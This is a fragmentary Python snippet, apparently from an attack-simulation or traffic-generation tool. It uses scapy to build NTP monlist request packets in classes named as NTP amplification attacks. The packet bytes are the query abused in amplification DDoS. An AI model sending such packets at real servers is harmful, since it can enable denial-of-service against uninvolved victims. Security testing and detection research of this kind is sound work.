...
from scapy.all import IP, UDP, Packet, Raw, Ether
...
class ntp_ampl_attack_0(monlist):
    ...
    def create(self: Self) -> Packet:
        ip_layer = IP(dst=self.ntp_server_ip)
        udp_layer = UDP(dport=123)
        data = "\x17\x00\x03\x2a" + "\x00" * 8
        return Ether() / ip_layer / udp_layer / Raw(load=data)
...
class ntp_ampl_attack_2(ntp_ampl_attack_1):
    ref = np.array(
        [
            26,
            1000,
